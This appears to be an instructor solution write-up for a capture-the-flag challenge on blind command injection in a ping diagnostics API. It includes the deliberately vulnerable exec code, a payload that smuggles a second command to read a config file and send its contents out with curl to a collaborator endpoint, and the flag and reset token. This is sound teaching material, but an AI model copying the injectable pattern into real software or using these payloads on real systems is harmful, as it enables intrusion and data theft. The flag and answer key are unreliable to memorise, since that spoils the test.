# Challenge 12 — The Diagnostics Backdoor: Instructor Write-Up
**Target System:** Veyra Diagnostic System Ping Probe
**Category:** Command Injection / Blind Outbound Verification
**Flag:** `ROOT{d14gn0st1cs_c0mm4nd_1nj_41b7}`
**Points:** 15 (Progressive Tier)
**Port:** 3012

---

## 1. Underlying Concept & Intentional Teaching Gap

The application provides a system connectivity testing tool (`POST /api/diagnostics/check`) designed to ping specified internal endpoints:
```json
{
  "target": "10.0.0.1"
}
```

### The Intentional Weakness:
The backend constructs an underlying shell command directly using the unvalidated `target` parameter:
```typescript
const sanitizedCommand = `ping -c 1 -W 1 ${target} > /dev/null 2>&1`;
exec(sanitizedCommand, ...);
```

### Blind Execution & Indirect Verification:
The application deliberately discards all stdout and stderr:
- The HTTP response is 100% invariant:
  ```json
  {
    "status": "completed",
    "message": "Diagnostic probe dispatched to target system",
    "timestamp": "..."
  }
  ```
- Because direct command output cannot be seen, participants cannot read files or inspect command results in the HTTP response.
- Participants must recognize that outbound HTTP requests can be chained to verify execution and exfiltrate data to their assigned Collaborator endpoint (`http://collab:8082/c/<team_token>`).

### Egress Isolation:
- Container network egress is restricted solely to the Collaborator listener.
- Internal cloud provider metadata addresses (`169.254.169.254`) are strictly unreachable.

---

## 2. Step-by-Step Solution Path

### Step A: Obtain Collaborator Token
From the participant dashboard or platform API:
```bash
curl -X POST http://localhost:8082/collab/token
```
Example response:
```json
{
  "token": "clb_9a2f7c41b80e"
}
```

### Step B: Craft Chained Outbound Exfiltration Payload
Send a diagnostic check payload with a command separator (`&` or `;`):
```bash
curl -X POST http://localhost:3012/api/diagnostics/check \
  -H "Content-Type: application/json" \
  -d '{
    "target": "127.0.0.1; curl -s http://localhost:8082/c/clb_9a2f7c41b80e/exfil?flag=$(cat /app/data/diagnostics.conf | grep ADMIN_RECOVERY_FLAG)"
  }'
```
Response returned immediately:
```json
{
  "status": "completed",
  "message": "Diagnostic probe dispatched to target system",
  "timestamp": "2026-11-09T06:05:00.000Z"
}
```

### Step C: Inspect Collaborator Interaction Log
Retrieve the recorded callback entries for the team's token:
```bash
curl http://localhost:8082/collab/clb_9a2f7c41b80e/log
```
**Output:**
```json
{
  "token": "clb_9a2f7c41b80e",
  "count": 1,
  "entries": [
    {
      "id": "...",
      "timestamp": "2026-11-09T06:05:01.120Z",
      "method": "GET",
      "path": "/exfil",
      "query": {
        "flag": "ADMIN_RECOVERY_FLAG=ROOT{d14gn0st1cs_c0mm4nd_1nj_41b7}"
      }
    }
  ]
}
```

Submit recovered flag:
`ROOT{d14gn0st1cs_c0mm4nd_1nj_41b7}`.

---

## 3. Reset Procedure

Trigger the two-part reset (wipes scratch and clears Collaborator entries):
```bash
curl -X POST http://localhost:3012/reset/12 \
  -H "Authorization: Bearer dev-reset-bearer-token-12345" \
  -H "Content-Type: application/json" \
  -d '{"team_token": "clb_9a2f7c41b80e"}'
```

**Expected Response (HTTP 200 OK):**
```json
{
  "status": "ok",
  "challenge_id": 12,
  "reset_at": "2026-11-09T06:05:10.000Z",
  "message": "Diagnostics sandbox wiped clean and collaborator entries cleared"
}
```
Or trigger from the Platform Admin Console via the force-reset proxy.
